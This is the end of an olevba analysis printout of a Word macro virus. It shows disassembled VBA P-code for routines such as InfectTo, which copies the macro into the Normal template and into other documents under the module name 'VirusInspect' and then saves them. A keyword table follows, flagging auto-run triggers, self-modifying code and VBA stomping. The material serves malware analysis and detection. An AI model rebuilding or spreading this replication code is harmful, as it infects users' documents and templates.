' 	QuoteRem 0x0002 0x002E "  doc.SaveAs FileName:=TempName, fileformat:=1"
' Line #276:
' 	QuoteRem 0x0002 0x000B "  doc.Close"
' Line #277:
' 	QuoteRem 0x0001 0x0010 "   Kill TempName"
' Line #278:
' 	QuoteRem 0x0001 0x001A "   On Error GoTo NewDocErr"
' Line #279:
' 	QuoteRem 0x0000 0x002F "    Set doc = Documents.Add(Template:=TempName)"
' Line #280:
' 	QuoteRem 0x0003 0x001D " doc.SaveAs FileName:=NewName"
' Line #281:
' 	ExitSub 
' Line #282:
' 	Label NewDocErr 
' Line #283:
' 	Label ErrSave 
' Line #284:
' Line #285:
' 	LitStr 0x0006 "ﾊｧｰﾜ｣｡"
' 	ArgsCall MsgBox 0x0001 
' Line #286:
' Line #287:
' 	EndSub 
' Line #288:
' Line #289:
' Line #290:
' 	FuncDefn (Function GetVer(prj As Variant) As Double)
' Line #291:
' 	QuoteRem 0x0000 0x001E "Dim pprj As Variant 'VBProject"
' Line #292:
' 	Dim 
' 	VarDefn VBCom (As Variant)
' 	QuoteRem 0x0015 0x000B "VBComponent"
' Line #293:
' 	Dim 
' 	VarDefn VerStr (As String)
' Line #294:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #295:
' 	Dim (Const) 
' 	LitStr 0x0007 "Version"
' 	VarDefn Tag (As String)
' Line #296:
' 	LitR8 0x0000 0x0000 0x0000 0x0000 
' 	St GetVer 
' Line #297:
' 	SetStmt 
' 	LitNothing 
' 	Set g_VBCom 
' Line #298:
' 	StartForVariable 
' 	Ld VBCom 
' 	EndForVariable 
' 	Ld prj 
' 	MemLd VBComponents 
' 	ForEach 
' Line #299:
' 	Ld Logo 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #300:
' 	SetStmt 
' 	Ld VBCom 
' 	Set g_VBCom 
' Line #301:
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	St GetVer 
' Line #302:
' 	OnError NoVer 
' Line #303:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VerStr 
' Line #304:
' 	LitDI2 0x0001 
' 	Ld VerStr 
' 	Ld Tag 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	St i 
' Line #305:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #306:
' 	Ld VerStr 
' 	Ld VerStr 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	Ld Tag 
' 	FnLen 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	St GetVer 
' Line #307:
' 	EndIfBlock 
' Line #308:
' 	Label NoVer 
' Line #309:
' 	ExitFunc 
' Line #310:
' 	EndIfBlock 
' Line #311:
' 	StartForVariable 
' 	Ld VBCom 
' 	EndForVariable 
' 	NextVar 
' Line #312:
' 	EndFunc 
' Line #313:
' 	FuncDefn (Function GetLatest() As Variant)
' Line #314:
' 	Dim 
' 	VarDefn prj (As Variant)
' 	QuoteRem 0x0013 0x0009 "VBProject"
' Line #315:
' 	Dim 
' 	VarDefn Ver (As Double)
' Line #316:
' 	SetStmt 
' 	LitNothing 
' 	Set GetLatest 
' Line #317:
' 	LitDI2 0x0000 
' 	St LatestVer 
' Line #318:
' 	StartForVariable 
' 	Ld prj 
' 	EndForVariable 
' 	Ld ThisDocument 
' 	MemLd Application 
' 	MemLd VBE 
' 	MemLd VBProjects 
' 	ForEach 
' Line #319:
' 	Ld prj 
' 	ArgsLd GetVer 0x0001 
' 	St Ver 
' Line #320:
' 	Ld Ver 
' 	Ld LatestVer 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #321:
' 	Ld Ver 
' 	St LatestVer 
' Line #322:
' 	SetStmt 
' 	Ld g_VBCom 
' 	Set GetLatest 
' Line #323:
' 	EndIfBlock 
' Line #324:
' 	StartForVariable 
' 	Ld prj 
' 	EndForVariable 
' 	NextVar 
' Line #325:
' 	EndFunc 
' Line #326:
' 	FuncDefn (Sub setup())
' Line #327:
' 	Ld ThisDocument 
' 	MemLd Application 
' 	MemLd NormalTemplate 
' 	ArgsCall (Call) InfectTo 0x0001 
' Line #328:
' 	LitStr 0x000A "Installed "
' 	Ld Logo 
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #329:
' Line #330:
' 	EndSub 
' Line #331:
' Line #332:
' 	FuncDefn (Function FoundMod(doc As Variant, ByVal s As String) As Variant)
' Line #333:
' 	Dim 
' 	VarDefn VBCom (As Variant)
' 	QuoteRem 0x0016 0x000B "VBComponent"
' Line #334:
' 	StartForVariable 
' 	Ld VBCom 
' 	EndForVariable 
' 	Ld doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #335:
' 	Ld VBCom 
' 	MemLd New 
' 	Ld s 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #336:
' 	SetStmt 
' 	Ld VBCom 
' 	Set FoundMod 
' Line #337:
' 	ExitFunc 
' Line #338:
' 	EndIfBlock 
' Line #339:
' 	StartForVariable 
' 	Next 
' Line #340:
' 	SetStmt 
' 	LitNothing 
' 	Set FoundMod 
' Line #341:
' 	EndFunc 
' Line #342:
' Line #343:
' 	FuncDefn (Sub InfectTo(doc As Variant))
' Line #344:
' 	Dim 
' 	VarDefn prj (As Variant)
' 	QuoteRem 0x0013 0x0009 "VBProject"
' Line #345:
' 	Dim 
' 	VarDefn VBCom
' 	VarDefn ObjCom (As Variant)
' 	QuoteRem 0x001D 0x000B "VBComponent"
' Line #346:
' 	Dim 
' 	VarDefn r (As Double)
' Line #347:
' 	Dim 
' 	VarDefn saved (As Boolean)
' Line #348:
' Line #349:
' Line #350:
' 	Dim (Const) 
' 	LitStr 0x000C "VirusInspect"
' 	VarDefn modname (As String)
' Line #351:
' Line #352:
' 	Ld doc 
' 	MemLd saved 
' 	St saved 
' Line #353:
' 	SetStmt 
' 	Ld GetLatest 
' 	Set VBCom 
' Line #354:
' 	Ld doc 
' 	MemLd VBProject 
' 	ArgsLd GetVer 0x0001 
' 	St r 
' Line #355:
' 	Ld r 
' 	Paren 
' 	SelectCase 
' Line #356:
' 	Ld LatestVer 
' 	CaseGe 
' 	CaseDone 
' 	BoS 0x0000 
' 	ExitSub 
' Line #357:
' 	CaseElse 
' Line #358:
' 	Ld r 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #359:
' 	LitStr 0x000A "Upgraded｣｡"
' 	Ld Logo 
' 	Concat 
' 	ArgsCall (Call) ShowStatus 0x0001 
' Line #360:
' 	ElseBlock 
' Line #361:
' 	LitStr 0x000B "Installed｣｡"
' 	Ld Logo 
' 	Concat 
' 	ArgsCall (Call) ShowStatus 0x0001 
' Line #362:
' 	EndIfBlock 
' Line #363:
' 	ArgsCall Beep 0x0000 
' Line #364:
' 	ArgsCall Beep 0x0000 
' Line #365:
' 	ArgsCall Beep 0x0000 
' Line #366:
' Line #367:
' 	EndSelect 
' Line #368:
' Line #369:
' 	SetStmt 
' 	Ld doc 
' 	Ld modname 
' 	ArgsLd FoundMod 0x0002 
' 	Set ObjCom 
' Line #370:
' 	Ld ObjCom 
' 	LitNothing 
' 	Is 
' 	Paren 
' 	IfBlock 
' Line #371:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set ObjCom 
' 	QuoteRem 0x0037 0x0015 "vbext_ct_StdModule  )"
' Line #372:
' 	Ld modname 
' 	Ld ObjCom 
' 	MemSt New 
' Line #373:
' 	EndIfBlock 
' Line #374:
' 	LitDI2 0x0001 
' 	Ld ObjCom 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ObjCom 
' 	MemLd CodeModule 
' 	ArgsMemCall (Call) DeleteLines 0x0002 
' Line #375:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld VBCom 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ObjCom 
' 	MemLd CodeModule 
' 	ArgsMemCall (Call) InsertLines 0x0002 
' Line #376:
' 	Ld saved 
' 	Paren 
' 	IfBlock 
' Line #377:
' 	OnError (Resume Next) 
' Line #378:
' 	Ld doc 
' 	MemLd FullName 
' 	Ld doc 
' 	ArgsMemCall (Call) SaveAs 0x0001 
' Line #379:
' 	EndIfBlock 
' Line #380:
' Line #381:
' 	EndSub 
' Line #382:
' Line #383:
' Line #384:
' Line #385:
' Line #386:
' Line #387:
' Line #388:
' Line #389:
' Line #390:
' Line #391:
' Line #392:
' Line #393:
' Line #394:
' Line #395:
' Line #396:
' Line #397:
' Line #398:
' Line #399:
' Line #400:
' Line #401:
' Line #402:
' Line #403:
' Line #404:
' Line #405:
' Line #406:
' Line #407:
' Line #408:
' Line #409:
' Line #410:
' Line #411:
' Line #412:
' Line #413:
' Line #414:
' Line #415:
' Line #416:
' Line #417:
' Line #418:
' Line #419:
' Line #420:
' Line #421:
' Line #422:
' Line #423:
' Line #424:
' Line #425:
' Line #426:
' Line #427:
' Line #428:
' Line #429:
' Line #430:
' Line #431:
' Line #432:
' Line #433:
' Line #434:
' Line #435:
' Line #436:
' Line #437:
' Line #438:
' Line #439:
' Line #440:
' Line #441:
' Line #442:
' Line #443:
' Line #444:
' Line #445:
' Line #446:
' Line #447:
' Line #448:
' Line #449:
' Line #450:
' Line #451:
' Line #452:
' Line #453:
' Line #454:
' Line #455:
' Line #456:
' Line #457:
' Line #458:
' Line #459:
' Line #460:
' Line #461:
' Line #462:
' Line #463:
' Line #464:
' Line #465:
' Line #466:
' Line #467:
' Line #468:
' Line #469:
' Line #470:
' Line #471:
' Line #472:
' Line #473:
' Line #474:
' Line #475:
' Line #476:
' Line #477:
' Line #478:
' Line #479:
' Line #480:
' Line #481:
' Line #482:
' Line #483:
' Line #484:
' Line #485:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

